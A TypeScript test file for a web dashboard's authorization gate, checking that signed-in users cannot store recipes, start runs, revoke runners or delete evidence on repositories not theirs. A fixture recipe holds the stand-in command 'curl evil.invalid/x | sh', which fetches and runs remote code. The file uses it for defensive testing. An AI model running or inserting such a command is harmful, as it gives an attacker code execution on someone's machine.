// Being signed in is not being allowed (9c).
//
// The write on this surface stores shell commands the engine later executes verbatim in
// a sandbox with a package registry reachable (ADR-0013). Locally that is safe because
// there is one operator on 127.0.0.1. Hosted on a public address, an unauthorized POST
// here is remote code execution on somebody else's runner — so every case below is a
// person who IS signed in, trying to reach a repository that is not theirs.
//
// The authorization answer comes from GitHub (`GET /user/installations`), which is why
// both halves are injected here: what is under test is the gate, not the API client.

import { describe, expect, it, vi } from 'vitest';
import type { Db } from '../src/store.js';
import type { Session } from '../src/auth.js';
import { dashboardRoutes } from '../src/routes.js';

const SESSION: Session = { id: 's', githubId: 1, login: 'divy97', avatarUrl: '', token: 'ghu' };

/** Answers the lookups the surface makes, and records every write. */
const fakeClient = (writes: string[] = []) =>
  ({
    // Params, not just SQL: `readRunRow` filters by `where run_id = $1`, and a fake that
    // ignores the parameter answers every lookup with the first row — which made a test
    // about seeing somebody else's run pass by handing back your own.
    query: vi.fn(async (sql: string, params?: unknown[]) => {
      writes.push(sql);
      const wanted = sql.includes('where run_id = $1') ? String(params?.[0] ?? '') : null;
      const rows =
        sql.includes('from installations')
          ? [
              { repo: 'mine/repo', installation_id: 1, account: 'me', connected_at: new Date(), removed_at: null },
              { repo: 'theirs/repo', installation_id: 2, account: 'them', connected_at: new Date(), removed_at: null },
            ]
          : sql.includes('from run_projection')
            ? [
                { run_id: 'r-mine', repo: 'mine/repo', issue_number: 1, status: 'pr_opened', started_at: new Date(), ended_at: null, tier: 2, score: 98, ceiling: 103, scoring: 2, reproduced: true, pr_number: 7, thread_ref: 'mine/repo#1' },
                { run_id: 'r-theirs', repo: 'theirs/repo', issue_number: 1, status: 'pr_opened', started_at: new Date(), ended_at: null, tier: 2, score: 98, ceiling: 103, scoring: 2, reproduced: true, pr_number: 8, thread_ref: 'theirs/repo#1' },
              ].filter((row) => wanted === null || row.run_id === wanted)
            : [];
      return { rows, rowCount: rows.length };
    }),
  }) as unknown as Db;

/** A surface where this person can see installation 1 and nothing else. */
const surface = (options: { session?: Session | null; installations?: number[]; writes?: string[] } = {}) =>
  dashboardRoutes({
    client: fakeClient(options.writes),
    installUrl: 'https://example.invalid',
    auth: {
      session: async () => (options.session === undefined ? SESSION : options.session),
      installations: async () => options.installations ?? [1],
    },
  });

const call = (
  route: ReturnType<typeof dashboardRoutes>,
  method: string,
  path: string,
  body = '',
  headers: Record<string, string> = {},
) =>
  route({
    method,
    path,
    query: new URLSearchParams(),
    headers,
    body: async () => body,
    raw: async () => Buffer.from(body),
  });

const RECIPE = new URLSearchParams({
  recipe: JSON.stringify({ install: 'curl evil.invalid/x | sh', services: [] }),
}).toString();

describe('a stranger is sent to the door', () => {
  it.each([['/repos'], ['/runs'], ['/runs/r-mine'], ['/repos/mine%2Frepo/onboard']])(
    'anonymous %s goes to sign in rather than rendering',
    async (path) => {
      const response = await call(surface({ session: null }), 'GET', path);
      expect(response?.status).toBe(302);
      expect(response?.headers?.['location']).toBe('/auth/github');
    },
  );

  it('an anonymous API request is told plainly, not redirected', async () => {
    // A redirect to an HTML login page is a 200 full of markup as far as a client is
    // concerned, and that is how "not signed in" becomes "the API returned garbage".
    const response = await call(surface({ session: null }), 'GET', '/api/runs');
    expect(response?.status).toBe(401);
  });

  it('an anonymous approval stores nothing', async () => {
    const writes: string[] = [];
    const response = await call(surface({ session: null, writes }), 'POST', '/repos/mine%2Frepo/onboard', RECIPE);
    expect(response?.status).toBe(302);
    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(false);
  });
});

describe('being signed in is not being allowed', () => {
  it('THE test: approving for a repository you cannot see stores nothing', async () => {
    // Signed in, valid session, correct origin — and installation 2 is not theirs. If
    // this passes, the recipe is stored and the next run on that repository executes
    // `curl evil.invalid/x | sh` on somebody else's machine.
    const writes: string[] = [];
    const response = await call(surface({ writes }), 'POST', '/repos/theirs%2Frepo/onboard', RECIPE);

    expect(response?.status).toBe(404);
    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(false);
  });

  it('and approving for one you CAN see is stored, so the refusal is not blanket', async () => {
    // The control. Without it the test above passes on a surface that refuses
    // everything, which is a working authorization check and a broken product.
    const writes: string[] = [];
    const response = await call(surface({ writes }), 'POST', '/repos/mine%2Frepo/onboard', RECIPE);

    expect(response?.status).toBe(303);
    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(true);
  });

  it('the onboarding page of a repository you cannot see is not found', async () => {
    const response = await call(surface(), 'GET', '/repos/theirs%2Frepo/onboard');
    expect(response?.status).toBe(404);
    // "Not connected", the same words an unknown repository gets. A stranger probing
    // names learns nothing about which ones this service knows.
    expect(String(response?.body)).toContain('is not connected');
  });

  it('the repository list shows theirs and not the other one', async () => {
    const response = await call(surface(), 'GET', '/repos');
    expect(String(response?.body)).toContain('mine/repo');
    expect(String(response?.body)).not.toContain('theirs/repo');
  });

  it('a run belonging to another installation is not found', async () => {
    const response = await call(surface(), 'GET', '/runs/r-theirs');
    expect(response?.status).toBe(404);
  });

  it('and the run list carries only what they may see', async () => {
    const response = await call(surface(), 'GET', '/api/runs');
    const rows = JSON.parse(String(response?.body)) as { repo: string }[];
    expect(rows.map((row) => row.repo)).toEqual(['mine/repo']);
  });

  it('deleting the evidence of a run you cannot see deletes nothing', async () => {
    // 9e's write. Destroying somebody's evidence is not a lesser thing to be allowed to
    // do than reading it, so it goes through the same gate as the run's own page.
    const writes: string[] = [];
    const route = dashboardRoutes({
      client: fakeClient(writes),
      installUrl: 'https://example.invalid',
      blobRoot: '/tmp/never-used-because-this-is-refused',
      auth: { session: async () => SESSION, installations: async () => [1] },
    });
    const response = await call(route, 'POST', '/runs/r-theirs/forget');

    expect(response?.status).toBe(404);
    expect(writes.some((sql) => sql.includes('insert into forgotten'))).toBe(false);
  });

  it('revoking a runner by id does not reach another installation s machine', async () => {
    // The IDOR this closes: the gate authorized `mine/repo` in the path and the runner
    // id came from the URL unchecked, so a valid session on any repository could revoke
    // any machine whose id it knew. The fake below records the SQL, and the assertion is
    // that the update is scoped rather than that it happened.
    const writes: string[] = [];
    const response = await call(surface({ writes }), 'POST', '/repos/mine%2Frepo/runners/somebody-elses-id/revoke');

    // Nothing matched, so nothing was revoked, and the answer is the one a runner that
    // does not exist gets.
    expect(response?.status).toBe(404);
    const revokes = writes.filter((sql) => sql.includes('set revoked_at'));
    expect(revokes).toHaveLength(1);
    expect(revokes[0]).toContain('installation_id = $2');
  });

  it('a GitHub that will not answer denies rather than admits', async () => {
    // `installationsFor` returns an empty list when GitHub is unreachable, and this is
    // what that means at the surface: an outage must not become an authorization.
    const writes: string[] = [];
    const response = await call(
      surface({ installations: [], writes }),
      'POST',
      '/repos/mine%2Frepo/onboard',
      RECIPE,
    );
    expect(response?.status).toBe(404);
    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(false);
  });
});

/**
 * Starting a run is a write, and gated like one (M10).
 *
 * `POST /api/runs` queues a job a worker will execute against a repository — clone,
 * install, run the recipe's commands. It is the webhook's old job behind a button, and
 * the button answers "may you" the way the approval does: before the installation is
 * looked up, and before GitHub is asked anything about the issue.
 */
describe('starting a run is a write, and gated like one', () => {
  const RECIPE_ROW = { recipe: { install: 'npm ci', services: [], test: 'npm test' } };

  /** Answers the lookups the trigger makes, and records every write WITH its params. */
  const triggerClient = (
    writes: { sql: string; params: unknown[] }[],
    options: { recipe?: boolean; open?: boolean } = {},
  ) =>
    ({
      query: vi.fn(async (sql: string, params: unknown[] = []) => {
        writes.push({ sql, params });
        const rows = sql.includes('from installations')
          ? [
              { repo: 'mine/repo', installation_id: 1, account: 'me', connected_at: new Date(), removed_at: null },
              { repo: 'theirs/repo', installation_id: 2, account: 'them', connected_at: new Date(), removed_at: null },
            ].filter((row) => !sql.includes('where repo = $1') || row.repo === params[0])
          : sql.includes('from recipes')
            ? (options.recipe ?? true)
              ? [RECIPE_ROW]
              : []
            : sql.includes('from jobs')
              ? options.open
                ? [{ run_id: 'already-running' }]
                : []
              : [];
        return { rows, rowCount: rows.length };
      }),
    }) as unknown as Db;

  /** GitHub as the picker and the button see it: one open issue, and one pull request. */
  const github = (asked: string[] = []) => ({
    token: async () => 'ghs_test',
    api: 'http://github.invalid',
    fetch: (async (input: string | URL | Request) => {
      const url = String(input instanceof Request ? input.url : input);
      asked.push(url);
      const path = new URL(url).pathname;
      const issue = {
        number: 41,
        title: 'The orders page title is misspelled',
        body: 'It says "Ordres".',
        html_url: 'https://github.com/mine/repo/issues/41',
        labels: [{ name: 'bug' }],
        updated_at: '2026-09-01T00:00:00Z',
      };
      // Every pull request is an issue to this endpoint, with one extra key.
      const pull = { ...issue, number: 42, title: 'Fix the title', pull_request: { url: 'x' } };
      if (path === '/repos/mine/repo/issues') return Response.json([issue, pull]);
      if (path === '/repos/mine/repo/issues/41') return Response.json(issue);
      if (path === '/repos/mine/repo/issues/42') return Response.json(pull);
      return new Response('not found', { status: 404 });
    }) as typeof fetch,
  });

  const trigger = (
    writes: { sql: string; params: unknown[] }[],
    options: { recipe?: boolean; open?: boolean; asked?: string[]; session?: Session | null; app?: boolean } = {},
  ) =>
    dashboardRoutes({
      client: triggerClient(writes, options),
      installUrl: 'https://example.invalid',
      auth: {
        session: async () => (options.session === undefined ? SESSION : options.session),
        installations: async () => [1],
      },
      ...(options.app === false ? {} : { github: github(options.asked) }),
    });

  const start = (route: ReturnType<typeof dashboardRoutes>, repo: string, issue = 41, type = 'application/json') =>
    call(route, 'POST', '/api/runs', JSON.stringify({ repo, issue_number: issue }), { 'content-type': type });

  const queued = (writes: { sql: string; params: unknown[] }[]) => writes.filter((w) => w.sql.includes('insert into jobs'));

  it('THE test: starting a run on a repository you cannot see queues nothing, and GitHub is never asked', async () => {
    // Signed in, valid session, a body a real page would send — and installation 2 is not
    // theirs. If this passes, a worker clones somebody else's repository and runs its
    // recipe on the strength of a session that was never allowed to see it.
    const writes: { sql: string; params: unknown[] }[] = [];
    const asked: string[] = [];
    const response = await start(trigger(writes, { asked }), 'theirs/repo');

    expect(response?.status).toBe(404);
    expect(queued(writes)).toHaveLength(0);
    // Before the issue is fetched, not after: an unauthorized request must not spend an
    // installation token reading a stranger's issue on its way to being refused.
    expect(asked).toHaveLength(0);
  });

  it('and starting one on a repository you CAN see is queued, so the refusal is not blanket', async () => {
    // The control. Without it the test above passes on a button that refuses everyone.
    const writes: { sql: string; params: unknown[] }[] = [];
    const response = await start(trigger(writes), 'mine/repo');

    expect(response?.status).toBe(202);
    const { run_id } = JSON.parse(String(response?.body)) as { run_id: string };
    expect(run_id).toMatch(/^[0-9a-f-]{36}$/);

    const [job] = queued(writes);
    expect(job).toBeDefined();
    // Who pressed the button and on what, as columns; and the same fact inside the intake
    // the worker will write as `RUN_REQUESTED`, so the log says it too.
    expect(job!.params[4]).toBe(SESSION.githubId);
    expect(job!.params[5]).toBe(41);
    const intake = JSON.parse(String(job!.params[3])) as { event: { thread_ref: string; requested_by?: string; source: string } };
    expect(intake.event.thread_ref).toBe('mine/repo#41');
    expect(intake.event.requested_by).toBe('divy97');
    // Still `github_issue`: that is where the report lives. Who asked is a second fact.
    expect(intake.event.source).toBe('github_issue');
  });

  it('an anonymous press is told plainly, and the picker likewise', async () => {
    const writes: { sql: string; params: unknown[] }[] = [];
    expect((await start(trigger(writes, { session: null }), 'mine/repo'))?.status).toBe(401);
    expect((await call(trigger(writes, { session: null }), 'GET', '/api/repos/mine%2Frepo/issues'))?.status).toBe(401);
    expect(queued(writes)).toHaveLength(0);
  });

  it('a repository with no recipe is answered, not run', async () => {
    // The onboarding gate the webhook path had (M6a), kept: a run against a repository
    // nobody has described would reproduce nothing and call that a finding.
    const writes: { sql: string; params: unknown[] }[] = [];
    const response = await start(trigger(writes, { recipe: false }), 'mine/repo');

    expect(response?.status).toBe(409);
    expect(JSON.parse(String(response?.body))).toMatchObject({ error: 'not onboarded' });
    expect(queued(writes)).toHaveLength(0);
  });

  it('a run already under way is not queued twice', async () => {
    const writes: { sql: string; params: unknown[] }[] = [];
    const response = await start(trigger(writes, { open: true }), 'mine/repo');

    expect(response?.status).toBe(409);
    expect(JSON.parse(String(response?.body))).toMatchObject({ run_id: 'already-running' });
    expect(queued(writes)).toHaveLength(0);
  });

  it('a pull request is not an issue, however it is numbered', async () => {
    // A run against a pull request is a run against a fix that already exists. The picker
    // never offers one; the button must not accept one typed in by hand either.
    const writes: { sql: string; params: unknown[] }[] = [];
    const response = await start(trigger(writes), 'mine/repo', 42);

    expect(response?.status).toBe(404);
    expect(queued(writes)).toHaveLength(0);
  });

  it('the picker lists what you may see, and drops pull requests', async () => {
    const asked: string[] = [];
    const mine = await call(trigger([], { asked }), 'GET', '/api/repos/mine%2Frepo/issues');
    expect(mine?.status).toBe(200);
    expect((JSON.parse(String(mine?.body)) as { number: number }[]).map((issue) => issue.number)).toEqual([41]);

    const theirs = await call(trigger([], { asked }), 'GET', '/api/repos/theirs%2Frepo/issues');
    expect(theirs?.status).toBe(404);
    // One fetch for the list that was allowed, none for the one that was not.
    expect(asked).toHaveLength(1);
  });

  it('a form body is refused as the wrong kind, before anything is looked up', async () => {
    const writes: { sql: string; params: unknown[] }[] = [];
    const response = await start(trigger(writes), 'mine/repo', 41, 'application/x-www-form-urlencoded');

    expect(response?.status).toBe(415);
    expect(writes).toHaveLength(0);
  });

  it('a surface with no App says so, rather than listing nothing', async () => {
    const writes: { sql: string; params: unknown[] }[] = [];
    expect((await start(trigger(writes, { app: false }), 'mine/repo'))?.status).toBe(501);
    expect((await call(trigger(writes, { app: false }), 'GET', '/api/repos/mine%2Frepo/issues'))?.status).toBe(501);
    expect(queued(writes)).toHaveLength(0);
  });
});

describe('the local surface is unchanged', () => {
  it('with no auth configured, nothing is gated', async () => {
    // ADR-0013's original shape: one operator, 127.0.0.1, the origin check is the
    // control. `serve.ts` still runs exactly this, and 9c must not have quietly
    // required a GitHub login to use your own laptop.
    const writes: string[] = [];
    const local = dashboardRoutes({ client: fakeClient(writes), installUrl: 'https://example.invalid' });
    const response = await call(local, 'POST', '/repos/theirs%2Frepo/onboard', RECIPE);

    expect(response?.status).toBe(303);
    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(true);
  });
});

/**
 * The front door, which for a while was the one page that never asked.
 *
 * Every other route here calls `visible(headers)` first. `/` did not — it rendered the
 * landing page for everyone and decided the sign-in link from `options.auth !== undefined`,
 * which answers "is login configured on this deployment", not "is this person logged
 * out". So a signed-in user who typed the bare hostname was shown a marketing page
 * offering them a sign-in they had already done, with no link to their own repositories.
 *
 * Nothing was broken underneath: the session was valid and `/repos` worked. The page
 * simply never looked, which is the kind of bug a test of the routes it DID gate cannot
 * find.
 */
describe('the landing page asks who you are', () => {
  it('a signed-in visitor is sent to their repositories, not offered a sign-in', async () => {
    const response = await call(surface(), 'GET', '/');

    expect(response?.status).toBe(302);
    expect(response?.headers?.location).toBe('/repos');
  });

  it('a signed-in visitor with no installations still goes to /repos, which is where the answer is', async () => {
    // Not a special case worth its own page: `/repos` is precisely the page that says
    // "you have not installed this anywhere yet".
    //
    // This input is also what a GitHub OUTAGE looks like — `installationsFor` answers `[]`
    // rather than throwing, deliberately, so that a failure to confirm access denies it
    // rather than granting it. Worth knowing that the front door behaves the same either
    // way, which it does because it never asks GitHub anything (see below).
    const response = await call(surface({ installations: [] }), 'GET', '/');

    expect(response?.status).toBe(302);
    expect(response?.headers?.location).toBe('/repos');
  });

  it('a signed-out visitor gets the landing page WITH a way in', async () => {
    const response = await call(surface({ session: null }), 'GET', '/');

    expect(response?.status).toBe(200);
    expect(response?.body).toContain('href="/auth/github"');
  });

  it('and locally, where there is no login, the landing page offers none', async () => {
    // The original reason the line was written the way it was, and it still holds:
    // one operator on 127.0.0.1, and a sign-in button would lead nowhere.
    const local = dashboardRoutes({ client: fakeClient(), installUrl: 'https://example.invalid' });
    const response = await call(local, 'GET', '/');

    expect(response?.status).toBe(200);
    expect(response?.body).not.toContain('href="/auth/github"');
  });

  it('asks who you are without asking what you own', async () => {
    // The property the first version of this fix broke. Reaching for `visible()` here is
    // the obvious move — it is what every other route does — and it buys an authorization
    // answer this route never reads: a GitHub `GET /user/installations` and an
    // `installations` query, on the front door, which then redirects to a page that asks
    // both again. Two round-trips to render a page that used to do no I/O at all.
    //
    // So: a session lookup, and nothing else.
    const writes: string[] = [];
    await call(surface({ writes }), 'GET', '/');

    expect(writes.some((sql) => sql.includes('from installations'))).toBe(false);
  });
});

/**
 * The pairing command is a command people PASTE. It has to be true.
 *
 * It shipped saying `ENGINE_PLANE_URL=<this service>` — a literal placeholder, on a page
 * served from the host it should have been naming — and, worse, `npx tf-runner`. There is
 * no `tf-runner` package of ours and `bin` is empty; `tf-runner` is a real name on the npm
 * registry owned by somebody else. So the instruction printed next to a freshly minted
 * credential was "download a stranger's package and execute it, with this token already in
 * your environment".
 */
describe('the pairing command names this service and nothing off the internet', () => {
  const mint = (headers: Record<string, string> = {}) =>
    call(surface(), 'POST', '/repos/mine%2Frepo/runners', 'name=laptop', headers);

  it('never tells anyone to npx a package that is not ours', async () => {
    const response = await mint();
    // The specific hazard, pinned by name: `npx` plus a bare package name on this page
    // is remote code execution on the operator's machine, invited by us.
    expect(response?.body).not.toContain('npx tf-runner');
    expect(response?.body).toContain('npm run runner');
  });

  it('prints the origin the operator is reading, not a placeholder', async () => {
    const response = await mint({ host: 'plane.example.dev', 'x-forwarded-proto': 'https' });

    expect(response?.body).toContain('ENGINE_PLANE_URL=https://plane.example.dev');
    expect(response?.body).not.toContain('&lt;this service&gt;');
  });

  it('trusts x-forwarded-proto, because the plane speaks plain HTTP behind a terminator', async () => {
    // Trusting the socket would print `http://` for an `https://` deployment, and a
    // runner dialling that gets a redirect it does not follow.
    const response = await mint({ host: 'plane.example.dev' });
    expect(response?.body).toContain('https://plane.example.dev');
  });

  it('and stays http on a laptop, where there is no terminator and no certificate', async () => {
    const response = await mint({ host: '127.0.0.1:8788' });
    expect(response?.body).toContain('ENGINE_PLANE_URL=http://127.0.0.1:8788');
  });
});

/**
 * What the pages PROMISE has to match what the deployment can do.
 *
 * The hosted plane holds no model key and runs no containers (ADR-0011, ADR-0019): work
 * goes to a paired runner, and nothing drafts a recipe there. Yet the pages offered to
 * "draft a recipe" and said a run starts by labelling an issue — the last of three steps.
 * Someone following that labels an issue, the plane logs `not onboarded — nothing queued`,
 * and the screen says nothing at all. That is the failure mode this project exists to
 * refuse, in the UI rather than in a verdict.
 *
 * `mode` is explicit rather than inferred from whether login is configured, because those
 * are two different questions — the conflation the landing page already had once.
 */
describe('a page promises only what its deployment can do', () => {
  /** Installed, but nothing has run: the state every one of these pages is about. */
  const noRunsYet = () =>
    ({
      query: vi.fn(async (sql: string) => {
        const rows = sql.includes('from installations')
          ? [{ repo: 'mine/repo', installation_id: 1, account: 'me', connected_at: new Date(), removed_at: null }]
          : [];
        return { rows, rowCount: rows.length };
      }),
    }) as unknown as Db;

  const page = async (path: string, mode?: 'local' | 'plane') =>
    (
      await call(
        dashboardRoutes({
          client: noRunsYet(),
          installUrl: 'https://example.invalid',
          ...(mode === undefined ? {} : { mode }),
          auth: { session: async () => SESSION, installations: async () => [1] },
        }),
        'GET',
        path,
      )
    )?.body as string;

  it('does not offer to draft a recipe where nothing drafts', async () => {
    const body = await page('/repos', 'plane');
    expect(body).toContain('write a recipe');
    expect(body).not.toContain('draft a recipe');
  });

  it('still offers drafting on a laptop, where installing one starts a drafting run', async () => {
    const body = await page('/repos', 'local');
    expect(body).toContain('draft a recipe');
  });

  it('names all three things a hosted run needs, not just the last one', async () => {
    const body = await page('/runs', 'plane');
    // The runner is the one nobody guesses: pairing mints a credential, and the machine
    // still has to be running for anything to execute.
    expect(body).toContain('runner paired');
    expect(body).toContain('approved recipe');
    expect(body).not.toContain('No runs yet. Label an issue');
  });

  it('tells a hosted operator the recipe box is theirs to fill', async () => {
    const body = await page('/repos/mine%2Frepo/onboard', 'plane');
    expect(body).toContain('the box is yours to fill');
  });

  it('and says no such thing locally, where a draft is coming', async () => {
    const body = await page('/repos/mine%2Frepo/onboard', 'local');
    expect(body).not.toContain('the box is yours to fill');
  });

  it('defaults to the restricted mode, so a deployment that forgot to say promises less', async () => {
    // Failing toward under-promising: a plane that renders as a laptop tells people to
    // wait for a draft that is never coming.
    expect(await page('/repos')).toContain('write a recipe');
  });
});
